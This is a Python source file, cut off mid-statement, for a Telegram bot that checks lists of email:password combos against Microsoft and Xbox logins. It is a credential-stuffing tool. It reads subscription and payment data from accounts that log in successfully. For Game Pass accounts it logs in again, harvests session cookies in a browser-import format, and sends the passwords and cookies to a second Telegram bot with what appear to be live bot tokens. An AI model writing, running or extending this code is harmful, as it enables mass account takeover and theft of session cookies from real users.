import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
import traceback
import json
import uuid
import re
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock
from urllib.parse import quote, unquote

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ============================================================
# TELEGRAM CONFIGURATION – DUAL BOT (USER COMMAND + GAMEPASS ONLY)
# ============================================================

# MAIN BOT (User interacts here – receives files, progress, ALL results, non-gamepass hits)
TELEGRAM_BOT_TOKEN_MAIN = "8565579191:AAEn_RTjudSQHKW2itS0JkiqDlrsh_0p61k"

# PREMIUM BOT (Receives ONLY Game Pass hits – aesthetic format, NO files)
TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"

# Your Telegram Chat ID (all messages go here)
TELEGRAM_CHAT_ID = "8260250818"

# ============================================================
# DOMAIN WHITELIST & SKIP CONFIGURATION
# ============================================================
# Set to None to disable domain filtering, or provide a list
DOMAIN_WHITELIST = [
    "login.live.com", "account.live.com", "login.microsoft.com", "account.microsoft.com",
    "login.microsoftonline.com", "xboxlive.com", "xboxservices.com", "gssps.microsoft.com",
    "title.mgt.xboxlive.com", "userpresence.xboxlive.com", "sessiondirectory.xboxlive.com",
    "aadcdn.msftauth.net", "aadcdn.msauth.net", "secure.aadcdn.microsoftonline-p.com",
    "msftauth.net", "msauth.net", "msidentity.com", "login.msa.akadns6.net", "login.msa.akadns7.net",
    "device.login.live.com", "auth.gfx.ms", "login.live.com.akadns6.net", "login.live.com.akadns7.net",
    "account.live.com.akadns.net", "xbox.ip.akadns.net", "xsts.auth.xboxlive.com",
    "user.auth.xboxlive.com", "xbl.auth.xboxlive.com", "device.auth.xboxlive.com",
    "title.auth.xboxlive.com", "profile.xboxlive.com", "social.xboxlive.com", "presence.xboxlive.com",
    "achievements.xboxlive.com", "leaderboards.xboxlive.com", "stats.xboxlive.com",
    "reputation.xboxlive.com", "privacy.xboxlive.com", "terms.xboxlive.com", "settings.xboxlive.com",
    "subscriptions.xboxlive.com", "entitlements.xboxlive.com", "catalog.xboxlive.com",
    "marketplace.xboxlive.com", "commerce.xboxlive.com", "rewards.xboxlive.com", "gamertag.xboxlive.com",
    "club.xboxlive.com", "group.xboxlive.com", "peoplehub.xboxlive.com", "messaging.xboxlive.com",
    "notifications.xboxlive.com", "activity.xboxlive.com", "broadcast.xboxlive.com", "capture.xboxlive.com",
    "cloudstorage.xboxlive.com", "savedata.xboxlive.com", "statserver.xboxlive.com", "matchmaking.xboxlive.com",
    "secure.xboxlive.com", "origin.xboxlive.com", "cds.xboxlive.com", "titleserver.xboxlive.com",
    "achievements.xboxservices.com", "stats.xboxservices.com", "leaderboards.xboxservices.com",
    "presence.xboxservices.com", "social.xboxservices.com", "profile.xboxservices.com",
    "privacy.xboxservices.com", "commerce.xboxservices.com", "subscriptions.xboxservices.com",
    "entitlements.xboxservices.com", "gamertag.xboxservices.com", "reputation.xboxservices.com",
    "marketplace.xboxservices.com", "rewards.xboxservices.com", "club.xboxservices.com", "group.xboxservices.com",
    "peoplehub.xboxservices.com", "messaging.xboxservices.com", "notifications.xboxservices.com",
    "activity.xboxservices.com", "broadcast.xboxservices.com", "capture.xboxservices.com",
    "cloudstorage.xboxservices.com", "savedata.xboxservices.com", "statserver.xboxservices.com",
    "matchmaking.xboxservices.com", "secure.xboxservices.com", "origin.xboxservices.com", "cds.xboxservices.com",
    "titleserver.xboxservices.com", "login.msa.akadns.net", "account.live.com.akadns.net",
    "login.live.com.nsatc.net", "client.hip.live.com", "client-s.gateway.messenger.live.com",
    "config-v2.skype.com", "browser.pipe.aria.microsoft.com", "vortex.data.microsoft.com",
    "mobile.pipe.aria.microsoft.com", "watson.telemetry.microsoft.com", "dc.services.visualstudio.com",
    "settings.data.microsoft.com", "self.events.data.microsoft.com", "skydrive.wns.windows.com",
    "wns.notify.windows.com", "notify.windows.com", "notify.live.com", "pushnotifications.xboxlive.com",
    "redirect.xboxlive.com", "consent.xboxlive.com", "login.xboxlive.com", "rp.xboxlive.com",
    "edge.xboxlive.com", "help.xboxlive.com", "support.xboxlive.com", "status.xboxlive.com",
    "forums.xboxlive.com", "feedback.xboxlive.com", "ideas.xboxlive.com", "community.xboxlive.com",
    "events.xboxlive.com", "tournaments.xboxlive.com", "lfg.xboxlive.com", "lookingforgroup.xboxlive.com",
    "gamepass.xboxlive.com", "gamepass.microsoft.com", "xboxgamepass.com", "xbox.com", "www.xbox.com",
    "assets1.xbox.com", "assets2.xbox.com", "images-eds.xboxlive.com", "images.xboxlive.com",
    "compass.xboxlive.com", "metadata.xboxlive.com", "store.xbox.com", "video.xbox.com", "music.xbox.com",
    "apps.xbox.com", "avatars.xbox.com", "avatar.xboxlive.com", "gamerpic.xboxlive.com", "xuid.xboxlive.com",
    "hotmail.com", "outlook.com", "live.com", "msn.com", "passport.com", "outlook.live.com",
    "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it", "hotmail.es", "hotmail.nl", "hotmail.be",
    "hotmail.se", "hotmail.dk", "hotmail.no", "hotmail.fi", "hotmail.pl", "hotmail.cz", "hotmail.hu",
    "hotmail.at", "hotmail.ch", "hotmail.gr", "hotmail.pt", "hotmail.ie", "hotmail.ru", "hotmail.co.il",
    "hotmail.co.in", "hotmail.co.id", "hotmail.co.jp", "hotmail.co.kr", "hotmail.co.th", "hotmail.co.nz",
    "hotmail.com.ar", "hotmail.com.au", "hotmail.com.br", "hotmail.com.cn", "hotmail.com.co",
    "hotmail.com.mx", "hotmail.com.my", "hotmail.com.pe", "hotmail.com.ph", "hotmail.com.sg",
    "hotmail.com.tr", "hotmail.com.tw", "hotmail.com.uy", "hotmail.com.ve", "hotmail.com.vn",
    "outlook.at", "outlook.be", "outlook.ch", "outlook.cz", "outlook.dk", "outlook.es", "outlook.fi",
    "outlook.fr", "outlook.de", "outlook.gr", "outlook.hu", "outlook.ie", "outlook.it", "outlook.nl",
    "outlook.no", "outlook.pl", "outlook.pt", "outlook.se", "outlook.co.id", "outlook.co.il",
    "outlook.co.in", "outlook.co.jp", "outlook.co.kr", "outlook.co.nz", "outlook.co.th", "outlook.co.uk",
    "outlook.com.ar", "outlook.com.au", "outlook.com.br", "outlook.com.mx", "outlook.com.my",
    "outlook.com.pe", "outlook.com.ph", "outlook.com.sg", "outlook.com.tr", "outlook.com.tw",
    "outlook.com.uy", "outlook.com.ve", "outlook.com.vn", "outlook.qq.com", "live.at", "live.be",
    "live.ch", "live.cz", "live.dk", "live.es", "live.fi", "live.fr", "live.de", "live.gr", "live.hu",
    "live.ie", "live.it", "live.nl", "live.no", "live.pl", "live.pt", "live.se", "live.co.id",
    "live.co.il", "live.co.in", "live.co.jp", "live.co.kr", "live.co.nz", "live.co.th", "live.co.uk",
    "live.com.ar", "live.com.au", "live.com.br", "live.com.mx", "live.com.my", "live.com.pe",
    "live.com.ph", "live.com.sg", "live.com.tr", "live.com.tw", "live.com.uy", "live.com.ve",
    "live.com.vn", "msn.at", "msn.be", "msn.ch", "msn.cz", "msn.dk", "msn.es", "msn.fi", "msn.fr",
    "msn.de", "msn.gr", "msn.hu", "msn.ie", "msn.it", "msn.nl", "msn.no", "msn.pl", "msn.pt", "msn.se",
    "msn.co.id", "msn.co.il", "msn.co.in", "msn.co.jp", "msn.co.kr", "msn.co.nz", "msn.co.th",
    "msn.co.uk", "msn.com.ar", "msn.com.au", "msn.com.br", "msn.com.mx", "msn.com.my", "msn.com.pe",
    "msn.com.ph", "msn.com.sg", "msn.com.tr", "msn.com.tw", "msn.com.uy", "msn.com.ve", "msn.com.vn"
]
SKIP_ON_CONSECUTIVE_FAILURES = 5
MAX_CONCURRENT_WORKERS = 15
TASK_TIMEOUT_SECONDS = 30

# ============================================================
# HUMAN-LIKE COOKIE EXTRACTOR FOR XBOX PLAY PAGE
# ============================================================

def extract_human_cookies_from_xbox_play(email, password):
    """
    Performs a REAL browser-like login to https://www.xbox.com/en-US/play
    Extracts cookies EXACTLY as a human would get them via Cookie-Editor
    Returns cookies in format ready for import
    """
    try:
        session = requests.Session()
        
        # Realistic browser headers
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive",
        }
        
        # Step 1: Go to Xbox Play page to get initial redirect to login
        print(f"[COOKIE] Starting login process for {email}")
        r = session.get("https://www.xbox.com/en-US/play", headers=headers, allow_redirects=True, timeout=15)
        
        # Step 2: Microsoft OAuth login flow
        login_url = "https://login.live.com/login.srf"
        params = {
            "wa": "wsignin1.0",
            "rpsnv": "16",
            "ct": str(int(time.time() * 1000)),
            "rver": "7.5.2211.0",
            "wp": "MBI",
            "wreply": "https://www.xbox.com/en-US/play",
            "lc": "1033",
            "id": "293289",
            "mkt": "EN-US",
            "cbcxt": "mai"
        }
        
        r2 = session.get(login_url, params=params, headers=headers, timeout=15)
        
        # Extract PPFT token
        ppft_match = re.search(r'name="PPFT" content="([^"]+)"', r2.text)
        if not ppft_match:
            # Try alternative pattern
            ppft_match = re.search(r'"PPFT":"([^"]+)"', r2.text)
        if not ppft_match:
            print(f"[COOKIE] Failed to extract PPFT for {email}")
            return []
        ppft = ppft_match.group(1)
        
        # Extract login POST URL
        url_post_match = re.search(r'urlPost:"([^"]+)"', r2.text)
        if not url_post_match:
            url_post_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        if not url_post_match:
            print(f"[COOKIE] Failed to extract post URL for {email}")
            return []
        post_url = url_post_match.group(1).replace('\\/', '/')
        
        # Step 3: Post login credentials
        login_data = {
            "login": email,
            "loginfmt": email,
            "passwd": password,
            "PPFT": ppft,
            "PPSX": "Passport",
            "NewUser": "1",
            "LoginOptions": "1"
        }
        
        r3 = session.post(post_url, data=login_data, headers=headers, allow_redirects=False, timeout=15)
        
        # Follow redirects to complete login
        redirect_count = 0
        current_response = r3
        while current_response.status_code in [301, 302, 303, 307, 308] and redirect_count < 10:
            location = current_response.headers.get('Location', '')
            if not location:
                break
            # Handle relative redirects
            if location.startswith('/'):
                location = "https://login.live.com" + location
            current_response = session.get(location, headers=headers, allow_redirects=False, timeout=15)
            redirect_count += 1
        
        # Step 4: Visit Xbox Play page again to get final cookies
        final_response = session.get("https://www.xbox.com/en-US/play", headers=headers, timeout=15)
        
        # Step 5: Extract all cookies in Cookie-Editor format
        cookies_list = []
        for cookie in session.cookies:
            cookie_dict = {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain if cookie.domain else ".xbox.com",
                "hostOnly": False if cookie.domain and cookie.domain.startswith('.') else True,
                "path": cookie.path if cookie.path else "/",
                "secure": True,
                "httpOnly": cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
                "sameSite": "no_restriction",
                "session": cookie.expires is None,
                "firstPartyDomain": "",
                "partitionKey": None,
                "storeId": None
            }
            if cookie.expires:
                cookie_dict["expirationDate"] = cookie.expires
            cookies_list.append(cookie_dict)
        
        # Also extract from the final response
        for cookie in final_response.cookies:
            if cookie.name not in [c['name'] for c in cookies_list]:
                cookie_dict = {
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": ".xbox.com",
                    "hostOnly": False,
                    "path": "/",
                    "secure": True,
                    "httpOnly": False,
                    "sameSite": "no_restriction",
                    "session": True,
                    "firstPartyDomain": "",
                    "partitionKey": None,
                    "storeId": None
                }
                cookies_list.append(cookie_dict)
        
        print(f"[COOKIE] Successfully extracted {len(cookies_list)} cookies for {email}")
        return cookies_list
        
    except Exception as e:
        print(f"[COOKIE] Error extracting cookies for {email}: {e}")
        return []


# ============================================================
# AESTHETIC GAMEPASS-ONLY SENDER – "POOKIE" FORMAT + REAL COOKIES
# ============================================================

class GamePassOnlyPremiumSender:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
    
    def send_gamepass_hit(self, email, password, data):
        """Send ONLY Game Pass hits with aesthetic format to premium bot – NO FILES"""
        # Double-check this is actually Game Pass
        premium_type = data.get('subscription', data.get('premium_type', ''))
        if 'GAME PASS' not in premium_type.upper() and 'ULTIMATE' not in premium_type.upper():
            print(f"[!] Skipping non-gamepass hit to premium bot: {premium_type}")
            return False
        
        message = self._format_aesthetic_hit(email, password, data)
        
        def _send():
            try:
                url = f"{self.base_url}/sendMessage"
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": None}
                requests.post(url, data=payload, timeout=10)
                print(f"[✓] GAMEPASS hit sent to PREMIUM bot: {email}")
                
                # Extract REAL human-like cookies from Xbox play page
                cookies = extract_human_cookies_from_xbox_play(email, password)
                
                if cookies and len(cookies) > 0:
                    cookie_json = json.dumps(cookies, indent=4)
                    temp_dir = tempfile.mkdtemp()
                    cookie_file = os.path.join(temp_dir, f"{email.replace('@', '_at_')}_xbox_cookies.txt")
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        f.write("// Xbox Cookies for: " + email + "\n")
                        f.write("// Website: https://www.xbox.com/en-US/play\n")
                        f.write("// Import using Cookie-Editor extension\n")
                        f.write("// 1. Open Cookie-Editor\n")
                        f.write("// 2. Click 'Import'\n")
                        f.write("// 3. Select this file\n")
                        f.write("// 4. Visit https://www.xbox.com/en-US/play\n\n")
                        f.write(cookie_json)
                    
                    with open(cookie_file, 'rb') as f:
                        files = {'document': f}
                        doc_data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🍪 REAL XBOX COOKIES for {email}\n\n✅ Extracted from LIVE login to https://www.xbox.com/en-US/play\n📍 Import via Cookie-Editor → You'll be logged in"}
                        requests.post(f"{self.base_url}/sendDocument", files=files, data=doc_data, timeout=15)
                    
                    shutil.rmtree(temp_dir)
                    print(f"[✓] REAL COOKIES sent for: {email} ({len(cookies)} cookies)")
                else:
                    print(f"[!] No cookies extracted for: {email}")
                    
            except Exception as e:
                print(f"[✗] Premium bot error: {e}")
        
        threading.Thread(target=_send, daemon=True).start()
        return True
    
    def _format_aesthetic_hit(self, email, password, data):
        premium_type = data.get('subscription', data.get('premium_type', 'GAME PASS ULTIMATE'))
        country = data.get('country', 'N/A')
        days = data.get('days_remaining', '0')
        auto_renew = data.get('renewal', data.get('auto_renew', 'NO'))
        renewal_date = data.get('expire', data.get('renewal_date', 'N/A'))
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        
        if renewal_date != 'N/A' and renewal_date:
            try:
                renewal_obj = datetime.strptime(renewal_date, '%Y-%m-%d')
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        message = (
            f"🧎̻🧎̻  🎮🎀\n"
            f"🌷 {email} 🌷 🔐 {password}\n"
            f"🌸 {premium_type} ({country}) ⏳ {days} days 🔁 Renews {renewal_formatted} 💸 ${total_amount} {currency}\n"
            f"🧎̻ ✧♡\n"
            f"✨ 𝒂𝒊 @StarLuxHub ✨"
        )
        return message


# ============================================================
# XBOX CHECKER – DanteLogic CLASS (100% INTACT)
# ============================================================

class DanteLogic:
    def __init__(self, debug=False):
        self.debug = debug
        self.retry_delay = 3
    
    def log(self, message):
        if self.debug:
            print("[DEBUG] " + message)
    
    def DanteLogic0(self, date_str):
        try:
            if not date_str:
                return "0"
            date_str = re.sub(r'\.\d+', '', date_str)
            if 'Z' not in date_str and '+' not in date_str:
                date_str += 'Z'
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining) if remaining > 0 else "0"
        except Exception:
            return "0"
    
    def DanteLogic5(self, data):
        subs = []
        def traverse(obj):
            if isinstance(obj, dict):
                has_date = 'nextRenewalDate' in obj or 'expirationDate' in obj or 'validTo' in obj
                if has_date:
                    item_str = json.dumps(obj)
                    found_kw = None
                    keywords = [
                        'Xbox Game Pass Ultimate', 'Xbox Game Pass Core', 'Xbox Game Pass Console',
                        'PC Game Pass', 'Game Pass Premium', 'Game Pass Essential', 'Game Pass',
                        'EA Play Pro', 'EA Play', 'Ubisoft+ Classics', 'Ubisoft+ Premium',
                        'Xbox Live Gold', 'Xbox Cloud Gaming'
                    ]
                    for kw in keywords:
                        if kw.lower() in item_str.lower():
                            found_kw = kw
                            break
                    if found_kw:
                        date_val = obj.get('nextRenewalDate') or obj.get('expirationDate') or obj.get('validTo')
                        if date_val:
                            auto_renew_val = obj.get('autoRenew', False)
                            auto_renew = "YES" if str(auto_renew_val).lower() == 'true' else "NO"
                            subs.append({'name': found_kw, 'full_date': str(date_val), 'auto_renew': auto_renew})
                for k, v in obj.items():
                    traverse(v)
            elif isinstance(obj, list):
                for item in obj:
                    traverse(item)
        traverse(data)
        return subs
    
    def DanteLogic6(self, email, password):
        try:
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}
            
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                return {"status": "FREE", "data": {}}
            
            correlation_id2 = str(uuid.uuid4())
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com"
            }
            
            urls_to_check = [
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            ]
            valid_subs = []
            seen_keys = set()
            
            for url in urls_to_check:
                try:
                    r8 = session.get(url, headers=payment_headers, timeout=15)
                    if r8.status_code == 200:
                        data = r8.json()
                        subs = self.DanteLogic5(data)
                        for s in subs:
                            days = self.DanteLogic0(s['full_date'])
                            if int(days) > 0:
                                s['days'] = days
                                s['date'] = s['full_date'].split('T')[0]
                                unique_key = f"{s['name']}_{s['date']}"
                                if unique_key not in seen_keys:
                                    seen_keys.add(unique_key)
                                    valid_subs.append(s)
                except Exception:
                    continue
            
            if valid_subs:
                valid_subs.sort(key=lambda x: int(x['days']), reverse=True)
                best_sub = valid_subs[0]
                subscription_data = {
                    'expire': best_sub['date'],
                    'days_remaining': best_sub['days'],
                    'renewal': best_sub['auto_renew'],
                    'subscription': best_sub['name']
                }
                return {"status": "PREMIUM", "data": subscription_data}
            
            return {"status": "FREE", "data": {}}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": {}}
        except requests.exceptions.ConnectionError:
            return {"status": "ERROR", "data": {}}
        except Exception:
            return {"status": "ERROR", "data": {}}
    
    def check(self, email, password):
        self.log("Checking: " + email)
        retries_used = 0
        for attempt in range(3):
            try:
                res = self.DanteLogic6(email, password)
                if res['status'] in ["ERROR", "TIMEOUT"]:
                    if attempt < 2:
                        retries_used += 1
                        time.sleep(1)
                        continue
                return res, retries_used
            except Exception:
                if attempt < 2:
                    retries_used += 1
                    time.sleep(1)
                    continue
        return {"status": "ERROR", "data": {}}, retries_used


# ============================================================
# RAILWAY TELEGRAM BOT – WITH DOMAIN FILTER + SKIP SYSTEM
# ============================================================

BOT_TOKEN = TELEGRAM_BOT_TOKEN_MAIN
task_queue = queue.Queue()
active_tasks = {}
active_tasks_lock = threading.Lock()
loop = None
app = None


class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.created_at = datetime.now()
        self.status = "pending"


def is_domain_allowed(email):
    if DOMAIN_WHITELIST is None:
        return True
    try:
        domain = email.split('@')[-1].lower()
        return domain in DOMAIN_WHITELIST
    except:
        return False


def process_single_file(task):
    try:
        with open(task.file_path, 'r', encoding='utf-8') as f:
            raw_lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if DOMAIN_WHITELIST:
            original_count = len(raw_lines)
            lines = [l for l in raw_lines if is_domain_allowed(l.split(':', 1)[0])]
            skipped_domain = original_count - len(lines)
        else:
            lines = raw_lines
            skipped_domain = 0
        
        if not lines:
            asyncio.run_coroutine_threadsafe(
                send_error_message(task, f"No valid accounts after domain filter. Skipped {skipped_domain} accounts."), 
                loop
            )
            return
        
        stats = {
            "total": len(lines), "total_original": len(raw_lines), "skipped_domain": skipped_domain,
            "checked": 0, "premium": 0, "free": 0, "bad": 0, "expired": 0, 
            "banned": 0, "two_factor": 0, "timeout": 0, "error": 0, "skipped_consecutive": 0
        }
        premium_results = []
        gamepass_results = []
        batch_buffer = []
        BATCH_SIZE = 10
        consecutive_failures = 0
        
        checker = DanteLogic(debug=False)
        gamepass_sender = GamePassOnlyPremiumSender()
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                consecutive_failures = 0
                
                result = None
                retries_used = 0
                
                def run_check():
                    nonlocal result, retries_used
                    result, retries_used = checker.check(email, password)
                
                check_thread = threading.Thread(target=run_check)
                check_thread.daemon = True
                check_thread.start()
                check_thread.join(timeout=TASK_TIMEOUT_SECONDS)
                
                if check_thread.is_alive():
                    stats["timeout"] += 1
                    stats["bad"] += 1
                    batch_buffer.append(f"{email}: TIMEOUT")
                    stats["checked"] += 1
                    consecutive_failures += 1
                    if consecutive_failures >= SKIP_ON_CONSECUTIVE_FAILURES:
                        stats["skipped_consecutive"] = len(lines) - idx
                        asyncio.run_coroutine_threadsafe(
                            send_skip_notification(task, stats, consecutive_failures), 
                            loop
                        )
                        break
                    continue
                
                status = result['status']
                data = result.get('data', {})
                result_entry = f"{email}:{password}"
                is_gamepass = False
                
                if status == "PREMIUM":
                    premium_type = data.get('subscription', data.get('premium_type', 'GAME PASS'))
                    days = data.get('days_remaining', '0')
                    result_entry += f" ✅ PREMIUM | {premium_type} | {days} days"
                    batch_buffer.append(result_entry)
                    premium_results.append((email, password, data))
                    stats["premium"] += 1
                    
                    if 'GAME PASS' in premium_type.upper() or 'ULTIMATE' in premium_type.upper():
                        is_gamepass = True
                        gamepass_results.append((email, password, data))
                        try:
                            gamepass_sender.send_gamepass_hit(email, password, data)
                            print(f"🎮 GAMEPASS HIT routed to PREMIUM BOT: {email}")
                        except Exception as e:
                            print(f"Failed to send gamepass hit: {e}")
                    
                elif status == "FREE":
                    stats["free"] += 1
                    result_entry += f" 🆓 FREE"
                    batch_buffer.append(result_entry)
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏰ EXPIRED"
                    batch_buffer.append(result_entry)
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🚫 BANNED"
                    batch_buffer.append(result_entry)
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🔐 2FA"
                    batch_buffer.append(result_entry)
                else:
                    stats["bad"] += 1
                    result_entry += f" ❌ BAD"
                    batch_buffer.append(result_entry)
                
                stats["checked"] += 1
                
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(
                        send_batch_update(task, batch_buffer.copy(), stats), 
                        loop
                    )
                    batch_buffer.clear()
                
                time.sleep(0.3)
                
            except Exception as e:
                stats["error"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                batch_buffer.append(f"{line[:40]}... ERROR: {str(e)[:30]}")
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(
                        send_batch_update(task, batch_buffer.copy(), stats), 
                        loop
                    )
                    batch_buffer.clear()
                consecutive_failures += 1
                if consecutive_failures >= SKIP_ON_CONSECUTIVE_FAILURES:
                    stats["skipped_consecutive"] = len(lines) - idx
                    break
        
        if batch_buffer:
            asyncio.run_coroutine_threadsafe(
                send_batch_update(task, batch_buffer.copy(), stats), 
                loop
            )
        
        premium_text = "\n".join([
